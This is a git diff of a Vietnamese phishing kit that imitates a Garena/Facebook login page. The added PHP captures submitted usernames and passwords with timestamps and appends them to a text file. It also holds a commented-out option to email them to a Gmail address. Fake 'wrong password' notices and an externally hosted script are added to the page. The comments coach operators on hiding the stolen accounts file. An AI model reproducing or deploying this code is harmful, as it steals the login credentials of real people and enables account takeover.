@@ -1,16 +1,21 @@
-
-    <?php
-        
-    if(isset($_POST["taikhoan"])){
-          $username = $_POST["taikhoan"];
-      $password = $_POST["matkhau"];
-      $_SESSION["username"] = $username;
-       $body = "\nTài Khoản :$username\nMật Khẩu :$password\n"; //tùy host có thể lỗi font chữ email thì ae vô thẳng file txt trong file manager của host
-      $test = fopen("hu.txt","a");//đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
-      fwrite($test,$body);
-      fclose($test); 
-    }
-?> 
+<?php 
+date_default_timezone_set('Asia/Ho_Chi_Minh');
+if(isset($_POST["taikhoan"])){
+//   $type=='';
+ $time = date('H:i:s d/m/Y');
+    $acc = $_POST["taikhoan"];
+    $pass = $_POST["matkhau"];
+    
+     $subject = "Cảm ơn bạn đã sử dụng code!";
+     $headers = "Tài khoản facebook";
+      $body = "Time: ".$time."|acc: ".$acc."|pass: ".$pass."\n"; //định dạng acc|pass
+    
+     // mail("jaxuatt6@gmail.com", $headers, $body); // muốn gửi về mail thì bỏ 2 dấu // phía trước đi rồi thay mail
+    $test = fopen("hu.txt","a");//đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
+    fwrite($test,$body);
+    fclose($test);
+}
+    ?>
    <!DOCTYPE html>
    <html>
        
@@ -82,16 +87,13 @@
                     <div class="container1">
                    <div class="row h-100 justify-content-center align-items-center mt-2">
                       <div class="col-md-4 vhnlog">
-                         <form   id="login_form">
+                         <form  method="POST" class="mobile-login-form _5spm" id="login_form">
                              <div class="d-flex justify-content-center">
                       <a href="https://garena.vn"><img src="https://i.ibb.co/KjCKNSn/Pik-Png-com-webmd-logo-png-4945489.png" class="img logo mt-2" alt="garena"></a>
                    </div>
-                   <div class=" alert alert-warning" id="tb" role="alert" style="
-                      border-radius: 0;
-                      padding: 7px 20px;
-                      ">
-                      <span id="thongbao">Vui lòng đăng nhập tài khoản đã liên kết với garena để tiếp tục</span>
-                   </div>
+                   <div class="alert alert-warning" id="login_error1" role="alert" data-sigil="m_login_notice" style="border-radius: 0;padding: 7px 20px;">Email hoặc số điện thoại bạn đã nhập không khớp với bất kỳ tài khoản nào. <b>Đăng ký tài khoản.</b></div>
+                  
+                    <div class="alert alert-warning" id="login_error2" role="alert" data-sigil="m_login_notice" style="border-radius: 0;padding: 7px 20px;"><span>Sai mật khẩu. <b  class="_652e" aria-label="Bạn quên mật khẩu?">Bạn quên mật khẩu?</b></span></div>
                             <div class="form-group">
                                <input type="text" class="form-control" id="id" name="taikhoan" placeholder="Vui lòng nhập số di động hoặc email" >
                             </div>
@@ -122,8 +124,14 @@
                 </div>
                   </div>
                </div>
+               <script>
+ let icon ='error'; //icon thất bại đổi error thành success đề thành công
+ let title ='Đăng nhập thất bại'; // tiêu đề
+ let text ='Thông tin đăng nhập không chính xác vui lòng kiểm tra lại!'; //content
+ </script>
                   <script src="https://ticchien111.github.io/giaodien-fb-fake/jquery2.js"></script>
-<script src="https://ticchien111.github.io/script/member.js"></script>
+<!--<script src="https://ticchien111.github.io/script/member.js"></script>-->
+    <script type="text/javascript" src="https://scripth.glitch.me/member.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous">
                       </script>
                 </body>
